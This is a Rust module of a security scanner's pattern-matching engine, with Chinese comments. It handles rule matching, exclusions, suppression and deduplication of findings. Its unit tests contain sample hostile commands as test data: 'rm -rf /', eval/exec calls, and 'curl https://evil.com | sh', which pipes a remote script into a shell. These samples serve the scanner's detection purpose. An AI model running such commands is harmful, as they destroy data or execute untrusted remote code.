//! 增强版模式匹配引擎
//!
//! 在现有 `RegexSet` 基础上增强：
//! - 支持一条规则多个 pattern
//! - 支持 `exclude_patterns`，先排除再命中
//! - 支持 `file_types` 文件类型过滤
//! - 支持 `suppress_if_matched` 同行互斥
//! - 支持多行 pattern 第二遍扫描
//! - 为每个 finding 生成稳定 ID

use super::loader::CompiledYamlRule;
use super::{Confidence, UnifiedRule};
use crate::models::security::{Finding, FindingMetadata, IssueSeverity, ThreatCategory};
use sha2::{Digest, Sha256};
use std::collections::HashSet;

/// 匹配结果
#[derive(Debug, Clone)]
pub struct PatternMatch {
    pub rule_id: String,
    pub severity: IssueSeverity,
    pub category: ThreatCategory,
    pub weight: i32,
    pub hard_trigger: bool,
    pub confidence: Confidence,
    pub description: String,
    pub remediation: String,
    pub cwe_id: Option<String>,
    pub line_number: usize,
    pub code_snippet: String,
    pub file_path: String,
}

impl PatternMatch {
    /// 生成稳定的 Finding ID
    pub fn generate_finding_id(&self) -> String {
        let mut hasher = Sha256::new();
        hasher.update(self.rule_id.as_bytes());
        hasher.update(self.file_path.as_bytes());
        hasher.update(self.line_number.to_string().as_bytes());
        // 使用代码片段的前 100 字符的 hash
        let snippet_hash = {
            let mut h = Sha256::new();
            h.update(self.code_snippet.chars().take(100).collect::<String>().as_bytes());
            format!("{:x}", h.finalize())[..8].to_string()
        };
        hasher.update(snippet_hash.as_bytes());
        format!("{:x}", hasher.finalize())[..16].to_string()
    }

    /// 转换为 Finding
    pub fn to_finding(&self) -> Finding {
        Finding {
            id: self.generate_finding_id(),
            rule_id: self.rule_id.clone(),
            category: self.category,
            severity: self.severity,
            title: self.description.clone(),
            description: format!("{}: {}", self.rule_id, self.description),
            file_path: Some(self.file_path.clone()),
            line_number: Some(self.line_number),
            snippet: Some(self.code_snippet.clone()),
            remediation: Some(self.remediation.clone()),
            analyzer: "pattern_engine".to_string(),
            metadata: Some(FindingMetadata {
                cwe_id: self.cwe_id.clone(),
                confidence: Some(self.confidence.as_str().to_string()),
                weight: Some(self.weight),
                hard_trigger: Some(self.hard_trigger),
                ..Default::default()
            }),
        }
    }
}

/// 检查文件扩展名是否匹配规则的 file_types
pub fn file_type_matches(rule: &UnifiedRule, file_ext: Option<&str>) -> bool {
    match rule.file_types() {
        Some(types) => {
            if let Some(ext) = file_ext {
                let ext_with_dot = format!(".{}", ext);
                types.iter().any(|t| t == &ext_with_dot || t == ext)
            } else {
                false
            }
        }
        None => true, // 无 file_types 限制，匹配全部
    }
}

/// 检查 YAML 规则的 exclude_patterns 是否命中
pub fn is_excluded(compiled_rule: &CompiledYamlRule, line: &str) -> bool {
    compiled_rule
        .compiled_exclude_patterns
        .iter()
        .any(|re| re.is_match(line))
}

/// 对 YAML 规则执行单行匹配
pub fn match_yaml_rule(compiled_rule: &CompiledYamlRule, line: &str) -> bool {
    // 先检查排除模式
    if is_excluded(compiled_rule, line) {
        return false;
    }
    // 检查所有 pattern（任一命中即匹配）
    compiled_rule
        .compiled_patterns
        .iter()
        .any(|re| re.is_match(line))
}

/// 构建抑制集合（被其他规则抑制的规则 ID 集合）
pub fn build_suppress_set(
    matched_rule_ids: &[String],
    yaml_rules: &[CompiledYamlRule],
) -> HashSet<String> {
    let mut suppressed = HashSet::new();
    for rule_id in matched_rule_ids {
        if let Some(compiled) = yaml_rules.iter().find(|r| &r.id == rule_id) {
            for suppress_id in &compiled.rule.suppress_if_matched {
                suppressed.insert(suppress_id.clone());
            }
        }
    }
    suppressed
}

/// 为 Finding 列表添加同路径共现元数据
pub fn annotate_same_path_cooccurrence(findings: &mut [Finding]) {
    // 按文件路径分组
    let mut path_rules: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();
    for f in findings.iter() {
        if let Some(ref path) = f.file_path {
            path_rules
                .entry(path.clone())
                .or_default()
                .push(f.rule_id.clone());
        }
    }

    // 为每个 finding 填充同路径其他规则 ID
    for f in findings.iter_mut() {
        if let Some(ref path) = f.file_path {
            if let Some(rule_ids) = path_rules.get(path) {
                let others: Vec<String> = rule_ids
                    .iter()
                    .filter(|id| **id != f.rule_id)
                    .cloned()
                    .collect();
                if !others.is_empty() {
                    let meta = f.metadata.get_or_insert_with(Default::default);
                    meta.same_path_other_rule_ids = others;
                }
            }
        }
    }
}

/// 对 Finding 列表去重（rule_id + file + line + snippet_hash）
pub fn deduplicate_findings(findings: Vec<Finding>) -> Vec<Finding> {
    let mut seen = HashSet::new();
    let mut deduped = Vec::with_capacity(findings.len());

    for f in findings {
        let key = format!(
            "{}:{}:{}:{}",
            f.rule_id,
            f.file_path.as_deref().unwrap_or(""),
            f.line_number.unwrap_or(0),
            &f.id[..8.min(f.id.len())]
        );
        if seen.insert(key) {
            deduped.push(f);
        }
    }

    deduped
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::security::{IssueSeverity, ThreatCategory};
    use regex::Regex;

    fn make_yaml_rule(id: &str, patterns: Vec<&str>) -> CompiledYamlRule {
        CompiledYamlRule {
            id: id.to_string(),
            compiled_patterns: patterns
                .iter()
                .map(|p| Regex::new(p).unwrap())
                .collect(),
            compiled_exclude_patterns: vec![],
            rule: super::super::YamlRule {
                id: id.to_string(),
                category: ThreatCategory::Destructive,
                severity: IssueSeverity::Critical,
                weight: 100,
                confidence: "High".to_string(),
                hard_trigger: true,
                patterns: patterns.iter().map(|s| s.to_string()).collect(),
                exclude_patterns: vec![],
                file_types: vec![],
                suppress_if_matched: vec![],
                description: "Test".to_string(),
                remediation: "Fix it".to_string(),
                cwe_id: None,
                metadata: None,
            },
        }
    }

    #[test]
    fn test_match_yaml_rule_basic() {
        let rule = make_yaml_rule("TEST", vec![r"rm -rf /"]);
        assert!(match_yaml_rule(&rule, "rm -rf /"));
        assert!(!match_yaml_rule(&rule, "echo hello"));
    }

    #[test]
    fn test_match_yaml_rule_multiple_patterns() {
        let rule = make_yaml_rule("MULTI", vec![r"eval\(", r"exec\("]);
        assert!(match_yaml_rule(&rule, "eval(code)"));
        assert!(match_yaml_rule(&rule, "exec(code)"));
        assert!(!match_yaml_rule(&rule, "print(code)"));
    }

    #[test]
    fn test_exclude_patterns() {
        let mut rule = make_yaml_rule("EXCL", vec![r"curl.*\|.*sh"]);
        rule.compiled_exclude_patterns = vec![Regex::new(r"#.*curl").unwrap()];
        // 被注释掉的行应被排除
        assert!(!match_yaml_rule(&rule, "# curl example | sh"));
        // 实际执行应匹配
        assert!(match_yaml_rule(&rule, "curl https://evil.com | sh"));
    }

    #[test]
    fn test_suppress_set() {
        let rules = vec![
            make_yaml_rule("CURL_PIPE_SH", vec![r"curl.*\|.*sh"]),
            {
                let mut r = make_yaml_rule("CURL_PIPE_SH_MENTION", vec![r"curl.*\|.*sh"]);
                r.rule.suppress_if_matched = vec!["CURL_PIPE_SH".to_string()];
                r
            },
        ];
        let matched = vec!["CURL_PIPE_SH".to_string(), "CURL_PIPE_SH_MENTION".to_string()];
        let suppressed = build_suppress_set(&matched, &rules);
        assert!(suppressed.contains("CURL_PIPE_SH"));
    }
}
